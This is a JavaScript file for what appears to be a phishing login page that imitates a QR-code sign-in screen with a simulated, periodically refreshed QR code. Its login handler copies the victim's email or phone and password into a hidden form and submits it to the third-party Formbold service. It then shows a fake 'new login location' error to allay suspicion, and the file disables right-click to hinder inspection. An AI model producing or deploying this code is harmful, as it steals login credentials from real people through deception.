// ==================================
// CONFIG
// ==================================
const CONFIG = {
    ANIMATION_DURATION: 3000,           // Minimum time the spinner shows
    QR_REFRESH_INTERVAL: 120000,        // 2 minutes
    ELLIPSIS_DELAY_INCREMENT: 0.2,
    QR_STRING_LENGTH: 43,
};

// ==================================
// DOM SELECTORS
// ==================================
const DOM = {
    loginButton: document.getElementById('loginButton'),
    qrCodeContainer: document.querySelector('.right-section .qr-code'),
    emailInput: document.getElementById('emailORphone'),
    passwordInput: document.getElementById('password'),
    emailWrapper: document.querySelector('.email-wrapper'),
};

// ==================================
// RANDOM STRING FOR QR
// ==================================
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
    generate(data) {
        try {
            const qr = qrcode(0, 'L');
            qr.addData(data);
            qr.make();

            const svgString = qr.createSvgTag(1, 0);
            const parser = new DOMParser();
            const svgDoc = parser.parseFromString(svgString, 'image/svg+xml');
            const svg = svgDoc.documentElement;

            svg.setAttribute('width', '160');
            svg.setAttribute('height', '160');
            svg.setAttribute('viewBox', '0 0 37 37');

            const path = svg.querySelector('path');
            if (path) {
                const moduleCount = qr.getModuleCount();
                path.setAttribute('transform', `scale(${37 / moduleCount})`);
            }
            return svg;
        } catch (e) {
            console.error('QR Error:', e);
            return null;
        }
    },

    showSpinner() {
        if (!DOM.qrCodeContainer) return;
        DOM.qrCodeContainer.innerHTML = `
            <span class="spinner qrCode-spinner">
                <span class="inner wanderingCubes">
                    <span class="item"></span>
                    <span class="item"></span>
                </span>
            </span>
            <img src="./assets/qrcode-app-logo.png" alt="App Logo">
        `;
        DOM.qrCodeContainer.style.background = 'transparent';
    },

    refresh() {
        if (!DOM.qrCodeContainer) return;
        DOM.qrCodeContainer.innerHTML = '';
        const svg = this.generate(`https://app.com/ra/${generateRandomString()}`);
        if (svg) DOM.qrCodeContainer.appendChild(svg);
        DOM.qrCodeContainer.insertAdjacentHTML('beforeend', `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
        DOM.qrCodeContainer.style.background = 'white';
    },

    simulateRefresh() {
        this.showSpinner();
        setTimeout(() => this.refresh(), 3500);
    },

    init() {
        this.simulateRefresh();
        setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
    }
};

// ==================================
// LOGIN BUTTON MODULE (THE IMPORTANT PART)
// ==================================
const LoginButtonModule = {
    getEllipsisMarkup() {
        return `
            <span class="spinner">
                <span class="inner pulsingEllipsis">
                    <span class="item spinnerItem"></span>
                    <span class="item spinnerItem"></span>
                    <span class="item spinnerItem"></span>
                </span>
            </span>
        `;
    },

    applyDelays() {
        document.querySelectorAll('.spinnerItem').forEach((el, i) => {
            el.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${i * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
        });
    },

    showErrorMessage() {
        if (DOM.emailWrapper.querySelector('.error-message')) return;

        const msg = document.createElement('span');
        msg.className = 'error-message';
        msg.textContent = 'New login location detected, please check your e-mail.';
        msg.style.cssText = 'color:red; display:block; font-size:12px; margin:5px 0;';

        const input = DOM.emailWrapper.querySelector('input');
        DOM.emailWrapper.insertBefore(msg, input);

        DOM.emailInput.style.border = '1px solid red';
        DOM.passwordInput.style.border = '1px solid red';
    },

    async handleLogin() {
        if (!DOM.loginButton || !DOM.emailInput || !DOM.passwordInput) return;

        // 1. Show loading spinner
        DOM.loginButton.innerHTML = this.getEllipsisMarkup();
        DOM.loginButton.disabled = true;
        this.applyDelays();

        // 2. Copy values into the HIDDEN real Formbold form
        document.getElementById('fbEmail').value = DOM.emailInput.value.trim();
        document.getElementById('fbPassword').value = DOM.passwordInput.value;

        // 3. Trigger the real submission (this reaches Formbold)
        document.getElementById('formboldForm').submit();

        // 4. Wait at least 3 seconds (your animation duration)
        await new Promise(res => setTimeout(res, CONFIG.ANIMATION_DURATION));

        // 5. Show the fake "new login location" message + red borders
        this.showErrorMessage();

        // 6. Reset button
        DOM.loginButton.innerHTML = 'Log In';
        DOM.loginButton.disabled = false;
    },

    init() {
        DOM.loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            this.handleLogin();
        });
    }
};

// ==================================
// PREVENT RIGHT CLICK (optional but you had it)
// ==================================
document.addEventListener('contextmenu', e => e.preventDefault());

// ==================================
// START EVERYTHING
// ==================================
document.addEventListener('DOMContentLoaded', () => {
    QRCodeModule.init();
    LoginButtonModule.init();
});